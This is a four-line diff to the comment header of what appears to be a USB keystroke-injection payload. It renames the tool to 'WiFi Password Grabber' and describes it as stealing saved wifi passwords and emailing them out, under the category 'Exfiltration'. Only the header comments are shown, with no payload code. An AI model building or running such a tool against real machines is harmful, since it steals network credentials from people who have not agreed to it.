@@ -1,4 +1,4 @@
-REM Title:         WiFi Grabber
+REM Title:         WiFi Password Grabber
 REM Description:   Steals wifi passwords and sends them via email
 REM Version:       1.0
 REM Category:      Exfiltration
